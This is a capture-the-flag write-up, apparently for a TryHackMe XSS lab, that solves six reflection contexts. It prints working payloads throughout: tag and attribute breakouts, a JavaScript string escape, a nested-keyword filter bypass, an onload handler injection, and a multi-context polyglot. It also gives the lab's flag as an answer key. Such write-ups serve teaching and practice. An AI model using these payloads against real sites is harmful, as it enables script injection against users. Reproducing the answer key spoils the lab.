# Task 07 · Perfecting your payload (إتقان وتكييف حمولات XSS عبر مستويات الحماية الستة)

---

## Stage A: Original Task Content & Objective (المحتوى الأصلي والهدف)

Crafting successful XSS payloads requires understanding the **syntactic context** in which user input is reflected within the HTML/JavaScript document, as well as overcoming various filter mechanisms implemented by developers.

In this interactive lab, we progress through **six escalating levels** of context escaping and filter evasion. Each level demonstrates a distinct reflection context and teaches how to manipulate the DOM parser to execute arbitrary JavaScript:

- **Level 1 (Direct HTML Body Context):** Raw user input is reflected directly between body tags without any escaping.
- **Level 2 (HTML Attribute Value Context):** Input is reflected inside an `<input value="...">` attribute.
- **Level 3 (Textarea Tag Context):** Input is reflected inside a `<textarea>...</textarea>` block.
- **Level 4 (Inline JavaScript String Context):** Input is reflected inside a JavaScript variable declaration: `var name = 'USER_INPUT';`.
- **Level 5 (Keyword Blacklist Filter):** The application strips out the word `script` in a single non-recursive pass.
- **Level 6 (Angle Bracket Escaping):** The application strips or encodes `<` and `>`, preventing new tags, but reflects inside an existing HTML tag attribute (`<img src="...">`).

### Objective:
Solve all six levels sequentially, break out of each syntactic enclosure, trigger an `alert('THM')` execution on each level, and retrieve the master flag upon completing Level 6.

---

## Stage B: Independent Thinking & OpSec Considerations (التفكير المستقل والاعتبارات الأمنية والعملياتية)

1. **Context-Aware Escaping Mechanics:**
   - There is no single universal payload that works everywhere. The payload must adapt to the *execution context*.
   - If inside an attribute: break out of the quotes (`"` or `'`) and either close the tag (`>`) or add an event handler (`onload=`, `onerror=`, `onfocus=`).
   - If inside a `<script>` tag: do not inject `<script>` inside `<script>`. Instead, break out of string literals (`'; ... //`) or close the parent script (`</script>`).
2. **Filter Evasion Tactics:**
   - **Non-recursive filtering:** If a filter replaces `script` with `""`, passing `<sscriptcript>` causes the inner `script` to be deleted, joining the outer characters into `<script>`.
   - **Attribute-based execution:** When angle brackets `< >` are sanitized, you do not need to create new tags; you can inject event handlers (`onload`, `onerror`, `autofocus onfocus`) into the existing host tag.

---

## Stage C: Guided Hints (توجيهات تدريجية بدون حرق الإجابة)

- **Level 1 Hint:** Standard raw injection. Use basic `<script>` tags to trigger `alert('THM')`.
- **Level 2 Hint:** Close the value attribute with `"` and close the input tag with `>`, then append your script tag.
- **Level 3 Hint:** The browser treats anything inside a textarea as literal text until it sees `</textarea>`. Close it first!
- **Level 4 Hint:** Look at the JavaScript variable assignment. Close the single quote `'`, terminate the statement with `;`, call `alert('THM');`, and comment out the rest with `//`.
- **Level 5 Hint:** The server removes the word `script`. Nest the word inside itself: `<sscriptcript>`.
- **Level 6 Hint:** You cannot use `<` or `>`. Close the image `src` attribute with a double quote `"`, and add an `onload="alert('THM');"` event handler.

---

## Stage D: Complete Practical Solution & Technical Deep Dive (الحل العملي التفصيلي والتحليل التقني)

### Detailed Walkthrough of All 6 Levels:

#### 1. Level 1: Raw Reflection Context
- **Target DOM:**
  ```html
  <div class="header">Hello, [USER_INPUT]</div>
  ```
- **Exploitation:**
  Inject the standard canonical payload:
  ```html
  <script>alert('THM');</script>
  ```
- **Result:** Pops alert and unlocks Level 2.

---

#### 2. Level 2: Attribute Value Reflection (`<input>`)
- **Target DOM:**
  ```html
  <input type="text" name="name" value="[USER_INPUT]">
  ```
- **Exploitation:**
  If we inject `<script>`, the browser parses it as part of the attribute string: `value="<script>..."`.
  To break out, we close the attribute with `"` and close the input element with `>`:
  ```html
  "><script>alert('THM');</script>
  ```
- **Resulting DOM:**
  ```html
  <input type="text" name="name" value="">
  <script>alert('THM');</script>">
  ```
- **Result:** Pops alert and unlocks Level 3.

---

#### 3. Level 3: Textarea Tag Context
- **Target DOM:**
  ```html
  <textarea name="comment">[USER_INPUT]</textarea>
  ```
- **Exploitation:**
  Inside `<textarea>`, browsers do not execute scripts. We must explicitly close the `<textarea>` tag first:
  ```html
  </textarea><script>alert('THM');</script>
  ```
- **Resulting DOM:**
  ```html
  <textarea name="comment"></textarea>
  <script>alert('THM');</script>
  </textarea>
  ```
- **Result:** Pops alert and unlocks Level 4.

---

#### 4. Level 4: Inline JavaScript Variable Assignment Context
- **Target DOM:**
  ```html
  <script>
      var currentUserName = '[USER_INPUT]';
  </script>
  ```
- **Exploitation:**
  We are already inside an active `<script>` tag. Injecting another `<script>` tag here is invalid syntax. We need to:
  1. Close the string literal: `'`
  2. Terminate the assignment: `;`
  3. Execute our function: `alert('THM');`
  4. Comment out the trailing single quote and semicolon: `//`
  ```javascript
  ';alert('THM');//
  ```
- **Resulting DOM:**
  ```html
  <script>
      var currentUserName = '';alert('THM');//';
  </script>
  ```
- **Result:** Pops alert and unlocks Level 5.

---

#### 5. Level 5: Keyword Blacklist Evasion (Non-Recursive Replacement)
- **Target Context:**
  The server inspects user input and executes:
  ```php
  $input = str_replace("script", "", $input);
  ```
- **Exploitation:**
  Because the filter is not applied recursively in a `while` loop, we nest the word `script` inside another `script` string:
  ```html
  <sscriptcript>alert('THM');</sscriptcript>
  ```
  When the filter removes `script`, `s` and `cript` collapse together, recreating `<script>`!
- **Result:** Pops alert and unlocks Level 6.

---

#### 6. Level 6: Angle Bracket Sanitization (`<img>` Attribute Injection)
- **Target DOM:**
  ```html
  <img src="[USER_INPUT]">
  ```
- **Filter Constraint:** All `<` and `>` characters are completely stripped or HTML-entity encoded (`&lt;` and `&gt;`).
- **Exploitation:**
  We cannot create a `<script>` tag. However, we do not need to create any new tags! We can break out of the `src` attribute with a double quote `"` and inject a valid DOM event handler such as `onload`:
  ```html
  /images/cat.jpg" onload="alert('THM');
  ```
- **Resulting DOM:**
  ```html
  <img src="/images/cat.jpg" onload="alert('THM');">
  ```
  The browser requests `/images/cat.jpg`. When the image loads successfully, the `onload` event fires and executes `alert('THM')`!

Upon completing Level 6, the application generates the master flag:
```
Flag: THM{XSS_MASTER}
```

---

### Polyglot Payloads (One Payload to Rule Them All):
In black-box penetration testing where the context is unknown, security professionals utilize **XSS Polyglots**—crafted strings designed to execute successfully across multiple distinct HTML, attribute, and script contexts simultaneously:
```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

---

## Stage E: Final Answer & Key Values (الإجابات النهائية والقيم المفتاحية)

- **Question 1:** *What is the flag you received from level six?*
  - **Answer:** `THM{XSS_MASTER}`

---

## Stage F: Practical Verification & Proof of Work (التحقق العملي وإثبات الإنجاز)

- Flag `THM{XSS_MASTER}` submitted and verified with 100% precision on the TryHackMe platform.
- All six levels successfully solved with matching JavaScript DOM state reproductions.

---

## Stage G: Key Educational Takeaway (الخلاصة التعليمية المستفادة)

> **قاعدة ذهبية:** نجاح استغلال الـ XSS لا يعتمد على حفظ حمولة واحدة، بل على فهم **سياق الحقن** (Injection Context): فإذا كنت داخل وسم نصي تحتاج لإغلاقه (`</textarea>`)، وإذا كنت داخل سمة تحتاج لكسر علامات التنصيص (`">`)، وإذا كان الكود داخل كتل جافاسكريبت تكسر السلسلة النصية (`';//`)، وإذا تم حظر الأقواس `< >` تستغل معالجات الأحداث التلقائية (`onload / onerror`).
